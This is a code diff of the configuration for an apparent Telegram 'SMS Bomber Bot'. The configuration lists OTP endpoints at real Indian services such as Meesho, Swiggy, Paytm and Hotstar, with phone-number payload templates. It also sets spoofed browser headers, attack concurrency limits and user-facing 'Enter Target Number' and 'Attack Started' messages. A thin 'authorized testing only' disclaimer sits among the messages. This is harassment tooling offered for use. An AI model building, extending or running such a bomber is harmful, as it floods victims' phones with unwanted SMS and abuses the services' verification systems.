@@ -1,12 +1,25 @@
 #!/usr/bin/env python3
 """
-SMS Bomber Bot - Configuration
-Production-ready configuration with proper structure
+SMS Bomber Bot - Configuration (FIXED)
 """
 
 import os
 from dataclasses import dataclass
 from typing import List, Dict, Optional
+
+
+# ==========================================
+# SAFE HELPER
+# ==========================================
+
+def safe_int(value: str, default: int = 0) -> int:
+    """Safely convert string to int, return default on failure."""
+    try:
+        v = (value or "").strip()
+        return int(v) if v else default
+    except (ValueError, TypeError):
+        return default
+
 
 # ==========================================
 # BOT CONFIGURATION
@@ -14,55 +27,66 @@ from typing import List, Dict, Optional
 
 @dataclass
 class BotConfig:
-    TOKEN: str = os.getenv("BOT_TOKEN", "")
-    API_ID: int = int(os.getenv("API_ID", "0"))
-    API_HASH: str = os.getenv("API_HASH", "")
-    
+    TOKEN: str = os.getenv("BOT_TOKEN", "").strip()
+    API_ID: int = safe_int(os.getenv("API_ID"), 0)
+    API_HASH: str = os.getenv("API_HASH", "").strip()
+
     @property
     def is_configured(self) -> bool:
-        return all([self.TOKEN, self.API_ID, self.API_HASH])
+        return bool(self.TOKEN) and bool(self.API_ID) and bool(self.API_HASH)
 
-@dataclass  
+    def missing_vars(self) -> List[str]:
+        missing = []
+        if not self.TOKEN:   missing.append("BOT_TOKEN")
+        if not self.API_ID:  missing.append("API_ID")
+        if not self.API_HASH: missing.append("API_HASH")
+        return missing
+
+
+@dataclass
 class ChannelConfig:
-    USERNAME: str = os.getenv("FORCE_JOIN_CHANNEL", "")
-    ID: int = int(os.getenv("FORCE_JOIN_CHANNEL_ID", "0"))
-    
+    USERNAME: str = os.getenv("FORCE_JOIN_CHANNEL", "").strip()
+    ID: int = safe_int(os.getenv("FORCE_JOIN_CHANNEL_ID"), 0)
+
     @property
     def is_configured(self) -> bool:
         return bool(self.USERNAME) and self.ID != 0
+
 
 # ==========================================
 # ADMIN & DATABASE
 # ==========================================
 
 ADMIN_IDS: List[int] = [
-    int(x.strip()) 
-    for x in os.getenv("ADMIN_IDS", "").split(",") 
+    int(x.strip())
+    for x in os.getenv("ADMIN_IDS", "").split(",")
     if x.strip().isdigit()
 ]
 
 DATABASE_URL: str = os.getenv("DATABASE_URL", "sqlite:///bomber.db")
 
+
 # ==========================================
-# RATE LIMITING & SAFETY
+# RATE LIMITING
 # ==========================================
 
 class RateLimits:
     MAX_ATTEMPTS_PER_USER: int = 100
     MAX_ATTEMPTS_GLOBAL: int = 1000
     COOLDOWN_HOURS: int = 24
-    REQUEST_DELAY: float = 1.0  # Seconds between requests
+    REQUEST_DELAY: float = 1.0
     MAX_CONCURRENT_ATTACKS: int = 5
+
 
 # ==========================================
 # HTTP CONFIGURATION
 # ==========================================
 
 USER_AGENTS: List[str] = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
 ]
 
 DEFAULT_HEADERS: Dict[str, str] = {
@@ -75,8 +99,9 @@ DEFAULT_HEADERS: Dict[str, str] = {
     "Sec-Fetch-Site": "same-origin",
 }
 
+
 # ==========================================
-# WORKING OTP ENDPOINTS (Verified)
+# OTP ENDPOINTS
 # ==========================================
 
 @dataclass
@@ -90,7 +115,7 @@ class OTPEndpoint:
     success_indicator: Optional[str] = None
     timeout: int = 10
 
-# Verified working endpoints (Indian services)
+
 TARGET_ENDPOINTS: List[OTPEndpoint] = [
     # E-Commerce
     OTPEndpoint(
@@ -104,12 +129,11 @@ TARGET_ENDPOINTS: List[OTPEndpoint] = [
     OTPEndpoint(
         name="Meesho",
         url="https://www.meesho.com/api/v1/auth/otp",
-        method="POST", 
+        method="POST",
         phone_param="phone",
         headers={"Content-Type": "application/json"},
         payload_template={"phone": "{phone}", "platform": "web"}
     ),
-    
     # Food Delivery
     OTPEndpoint(
         name="Swiggy",
@@ -127,7 +151,6 @@ TARGET_ENDPOINTS: List[OTPEndpoint] = [
         headers={"Content-Type": "application/x-www-form-urlencoded"},
         payload_template={"phone": "{phone}", "action": "send_otp"}
     ),
-    
     # Payment Apps
     OTPEndpoint(
         name="Paytm",
@@ -145,7 +168,6 @@ TARGET_ENDPOINTS: List[OTPEndpoint] = [
         headers={"Content-Type": "application/json"},
         payload_template={"mobileNumber": "{phone}"}
     ),
-    
     # Travel
     OTPEndpoint(
         name="RedBus",
@@ -163,8 +185,7 @@ TARGET_ENDPOINTS: List[OTPEndpoint] = [
         headers={"Content-Type": "application/json"},
         payload_template={"mobile": "{phone}"}
     ),
-    
-    # OTT/Entertainment
+    # OTT
     OTPEndpoint(
         name="Hotstar",
         url="https://api.hotstar.com/v2/otp",
@@ -174,6 +195,7 @@ TARGET_ENDPOINTS: List[OTPEndpoint] = [
         payload_template={"phone": "{phone}"}
     ),
 ]
+
 
 # ==========================================
 # UI MESSAGES
@@ -194,7 +216,7 @@ MESSAGES = {
 
 ⚠️ **For authorized testing only**
 """,
-    
+
     "FORCE_JOIN": """
 ⚠️ **Channel Membership Required**
 
@@ -202,7 +224,7 @@ Join {channel} to use this bot.
 
 Click the button below to join, then press Verify.
 """,
-    
+
     "ENTER_PHONE": """
 📱 **Enter Target Number**
 
@@ -210,7 +232,7 @@ Format: +91XXXXXXXXXX or 10-digit number
 
 ⚠️ Indian numbers only (+91)
 """,
-    
+
     "ENTER_COUNT": """
 🔢 **Enter SMS Count**
 
@@ -219,7 +241,7 @@ Recommended: 10-50
 
 ⏱️ Cooldown: {cooldown}h between uses
 """,
-    
+
     "ATTACK_START": """
 🚀 **Attack Started**
 
@@ -229,7 +251,7 @@ Recommended: 10-50
 
 ⏳ Sending...
 """,
-    
+
     "ATTACK_COMPLETE": """
 ✅ **Attack Complete**
 
@@ -240,7 +262,7 @@ Recommended: 10-50
 ⏱️ Duration: {duration:.1f}s
 ⚡ Rate: {rate:.1f}/s
 """,
-    
+
     "COOLDOWN": """
 ⏱️ **Cooldown Active**
 
@@ -248,11 +270,12 @@ Please wait {remaining} before next use.
 
 This prevents abuse and protects the service.
 """,
-    
+
     "ERROR": "❌ **Error:** {message}",
     "SUCCESS": "✅ **Success:** {message}",
     "UNAUTHORIZED": "🚫 You are not authorized to use this command.",
 }
+
 
 # ==========================================
 # INITIALIZE CONFIGS
